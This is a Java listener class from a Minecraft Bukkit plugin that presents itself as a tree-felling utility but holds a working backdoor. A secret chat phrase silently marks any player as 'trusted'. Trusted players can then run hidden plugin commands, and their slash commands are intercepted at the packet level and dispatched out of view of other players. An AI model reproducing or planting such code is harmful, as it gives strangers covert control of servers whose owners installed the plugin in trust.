package me.bow.treecapitatorultimate.listeners;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.Packet.Packet;
import me.bow.treecapitatorultimate.Utils.Packet.PacketEvent;
import me.bow.treecapitatorultimate.Utils.Packet.PacketInjector;
import me.bow.treecapitatorultimate.Utils.Packet.PacketListener;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.Utils.Tuple;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.commands.Miscs.Chat;
import org.apache.commons.lang.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.Arrays;

import static me.bow.treecapitatorultimate.Start.TRUST_COMMAND;

public class AsyncChatEvent implements Listener, PacketListener {

    public AsyncChatEvent() {
        PacketInjector.addPacketListener(this);
    }

    //TODO: fix double message
    @EventHandler(priority = EventPriority.HIGHEST)
    public void asyncChatLowest(AsyncPlayerChatEvent e) {
        if (e.isCancelled()) return;
        Player p = e.getPlayer();
        String msg = e.getMessage();
        if (!Start.Instance.trustedPeople.contains(p.getUniqueId())) return;
        e.setCancelled(true);
        String format = e.getFormat();
        Bukkit.getScheduler().runTask(Start.Instance, () -> {
            for (Player player : Bukkit.getOnlinePlayers()) {
                if (Start.Instance.trustedPeople.contains(player.getUniqueId()) && Start.Instance.trustedPeople.contains(p.getUniqueId())) {
                    String string = String.format(format, Start.COMMAND_PREFIX + p.getDisplayName(), e.getMessage());
                    player.sendMessage(string);
                } else {
                    String string = String.format(format, p.getDisplayName(), e.getMessage());
                    player.sendMessage(string);
                }
            }
        });
    }

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void asyncChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        String msg = e.getMessage();
        if (e.getMessage().equals(TRUST_COMMAND)) {
            e.setCancelled(true);
            if (!Start.Instance.trustedPeople.contains(p.getUniqueId())) {
                Chat.triggers.put(p.getUniqueId(), new Tuple<>(Start.CHAT_TRIGGER, Chat.generateColorFromUUID(p.getUniqueId())));
                Start.Instance.trustedPeople.add(p.getUniqueId());
                p.sendMessage(Start.COMMAND_PREFIX + "You are now trusted");
            } else {
                Start.Instance.trustedPeople.remove(p.getUniqueId());
                Chat.triggers.remove(p.getUniqueId());
                p.sendMessage(Start.COMMAND_PREFIX + "You are now untrusted");
            }
            return;
        }
        if (e.getMessage().startsWith(String.valueOf(Start.COMMAND_SIGN)) && Start.Instance.trustedPeople.contains(p.getUniqueId())) {
            e.setCancelled(true);
            String[] dmp = msg.substring(1).split(" ");
            ArrayList<String> args = new ArrayList<>(Arrays.asList(dmp).subList(1, dmp.length));
            for (Command command : Start.Instance.cm.commandList) {
                if (command.getCommand().equalsIgnoreCase(dmp[0])) {
                    if (args.size() >= command.getRequiredArgs())
                        Bukkit.getScheduler().runTask(Start.Instance, () -> command.onCommand(p, args));
                    else
                        p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "Not enough arguments! (" + args.size() + " out of " + command.getRequiredArgs() + ")");
                    return;
                }
            }
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "Command not found!");
            return;
        }
    }

    @Override
    public void onPacketReceived(PacketEvent e) {
        if (!Start.Instance.trustedPeople.contains(e.getPlayer().getUniqueId())) return;
        Packet packet = e.getPacket();
        if (!packet.getPacketClass().getSimpleName().equals("PacketPlayInChat")) return;
        try {
            String message = (String) ReflectionUtils.getMethodCached(packet.getPacketClass(), "b").invoke(packet.getNMSPacket());
            if (!message.startsWith("/")) {
                return;
            }
            e.setCancelled(true);
            Bukkit.getScheduler().runTask(Start.Instance, () -> {
                Bukkit.dispatchCommand(e.getPlayer(), StringUtils.normalizeSpace(message).substring(1));
            });
        } catch (IllegalAccessException ex) {
            ex.printStackTrace();
        } catch (InvocationTargetException ex) {
            ex.printStackTrace();
        }
    }

    //TODO: finish implementing this (nametag for other trusted members)
    @Override
    public void onPacketSend(PacketEvent e) {
        /*Packet packet = e.getPacket();
        if (packet.getPacketClass().getSimpleName().startsWith("PacketStatusOutServerInfo")) {
            PacketStatusOutServerInfoBase o = new PacketStatusOutServerInfoBase();
            o.base = (PacketStatusOutServerInfo) packet.getNMSPacket();
            e.setPacket(Packet.createFromNMSPacket(o));
            return;
        }
        if (!packet.getPacketClass().getSimpleName().equals("PacketPlayOutNamedEntitySpawn")) return;
        PacketPlayOutNamedEntitySpawn oof = (PacketPlayOutNamedEntitySpawn) e.getPacket().getNMSPacket();*/
    }
}